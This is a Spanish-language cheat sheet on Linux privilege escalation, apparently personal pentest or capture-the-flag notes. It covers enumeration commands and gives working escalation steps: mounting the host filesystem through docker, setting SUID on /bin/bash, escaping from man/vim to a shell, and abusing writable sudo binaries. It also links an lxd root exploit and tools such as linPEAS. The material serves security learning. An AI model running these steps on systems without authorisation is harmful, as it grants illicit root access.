### Primeras comprobaciones
```bash
#### Grupos de usuario
###Ver si esta el usuario en algun grupo interesante, como el de docker
id

#### Ejecución de tareas como root
sudo -l

#### Permisos SUID, GUID y Binarios SH
find / -perm -4000 2>/dev/null
find / -perm -2000 2>/dev/null
find / -name *.sh
find / -name *.py
#### Versión de sudo
### teniendo la version de sudo se puede buscar alguna vulnerabilidad
sudo -V

#### Version del S.O
lsb_release -a

#### Version de kernel
uname -r

#### Listar tareas cron
ps -aux | grep cron
cat /etc/crontab
cat /etc/cron.d
crontab -l

#### Comprobar grupos
### A veces nuestro usuario no tiene privilegios, pero si el grupo al que pertenece.
id
find / -group "grupo"  -ls 2>/dev/null

###
Si pertenecemos al grupo pcap, mirar el apartado de "Wireshark" en la web
Si pertenecemos a un grupo que pueda ejecutar python, y encontramos un .py editable, podemos escalar facilmente.

#### Buscar capturas de wireshark
find / -name *.pcap* 2>/dev/null

#### Mirar las variables de entorno
### En ocasiones podemos encontrar credenciales, o aprovechar para ver si hay algo raro en el path
env

#### Comprobar el historial
history

cat $HOME/.bash_history

#### Comprobar servicios locales
### En ocasiones tenemos servicios como Mysql o algun panel de admin que solo funciona desde la máquina local, hay 2 maneras:
netstat -tuln
ss -tuln

### Capabilities
getcap -r / 2>/dev/null

### Mirar directorio opt
ls -la /opt

#TIPS
Mirar en /opt
Mirar si hubiera credenciales de root en ficheros de conexion a bases de datos, en caso de tener una web.
Mirar /home de usuarios
Mirar /etc/passwd para descubrir usuarios
Mirar binarios interesantes y si es necesario descompilar con ghidra

 SI NADA DE LO DE ARRIBA FUNCIONA, MIRAR RESTO DE SECCIONES DE HACKING LINUX
```

### Docker
Pudiendo ejecutar docker sin ser root, se puede escalar privilegios y montar el sistema de ficheros de la maquina real en el contenedor de forma que podremos acceder a todo.

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

>NOTA
>Seremos root en el contenedor, no en la máquina. Pero podremos acceder a todo el sistema de ficheros, una vez hecho esto:

```bash
chmod u+s /bin/bash
bash -p
```

### Binario con permisos de edición y ejecución

Con sudo -l vemos que se puede ejecutar como root, sus permisos nos deja editar el fichero, algo así ==rwxrwxrwx==. editamos dicho binario y le metemos el comando==su -==.


### Pivoting / escalada privilegios con man
Tanto escalada como pivoting, si podemos ejecutar un binario como otro usuario (Sudo -L), y este binario tiene un manual, este se nos abre con vim. Lo que ocurre es que vim tiene un modo de comandos, en el que facilmente podemos hacer un:
```bash
!/bin/bash
```

y nos lanzamos una bash como ese usuario con el que ejecutamos el binario.
```bash
sudo -u usuario /bin/binario
```

### Vulnerabilidad lxd
si el usuario pertenede al grupo lxd, (comprobar con comando id), existe un exploit para escalar privilegios a root.
https://github.com/initstring/lxd_root

### Herramientas automatizadas escalada privilegios

#### LES (Linux exploit suggester)
[Linux Exploit Suggester](https://github.com/The-Z-Labs/linux-exploit-suggester)
Herramienta que busca vulnerabilidades a nivel de kernel de linux

#### linPEAS
[LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
Herramienta que busca posibles malas configuraciones en la maquina para intentar escalar privilegios

### Pspy
[Pspy](https://github.com/DominicBreuker/pspy)
Herramienta para monitorizar tareas cron
<a href="https://glmbxecurity.github.io/docs/5-hacking-linux/path-hijacking/"></a>
### Linux exploit suggester (Kernel exploits)
Automatizacion para tratar de buscar vulnerabilidades a nivel de kernel y más,
[Linux exploit suggester V1](https://github.com/The-Z-Labs/linux-exploit-suggester)
[Linux exploit suggester V2](https://github.com/jondonas/linux-exploit-suggester-2)




